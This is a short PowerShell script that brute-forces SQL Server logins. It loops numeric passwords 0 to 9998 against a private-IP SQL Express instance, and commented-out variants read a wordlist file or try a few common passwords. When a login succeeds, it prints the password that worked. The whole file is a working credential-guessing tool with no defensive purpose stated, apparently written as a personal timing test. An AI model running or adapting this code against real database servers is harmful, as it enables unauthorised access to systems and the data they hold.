function test-SqlConnection()
{
    param($username='sa',[parameter(Mandatory=$true)][string]$password,[parameter(Mandatory=$true)][string]$server)
    $connBuilder = new-object System.Data.SqlClient.SqlConnectionStringBuilder
    $connBuilder['User ID'] = $username
    $connBuilder['Password'] = $password
    $connBuilder['Data Source'] = $server
    $conn = New-Object System.Data.SqlClient.SqlConnection
    $conn.ConnectionString = $connBuilder.ToString();
    try
    {
        $conn.Open()
        Write-Host 'Connection Completed'
        Write-Host "Username : sa , Password : $password"
        $true
    }catch{
        Write-Host 'Connection Failed'
        $false
    }
    
}

function main()
{
    <#
        param([string]$wordListFile)
        gc $wordListFile | %{
            test-SqlConnection -username 'sas' -password '123' -server 'JAMEEL-Laptop\SQLEXPRESS'
        }
        #>
        for($i = 0;$i -lt 9999;$i++)
        {
            if(test-SqlConnection -username 'sas' -password $i -server '192.168.233.1\SQLEXPRESS'){break}
        }
        <#
        $passes = '123','1234','12345'
        $passes | % { 
            if(test-SqlConnection -username 'sas' -password $_ -server 'JAMEEL-Laptop\SQLEXPRESS'){break}
        }#>
}

#This is just used to measure how long it takes to scan roughly 1000 passwords 
function time()
{
    main
}

. time
#JAMEEL-Laptop\SQLEXPRESS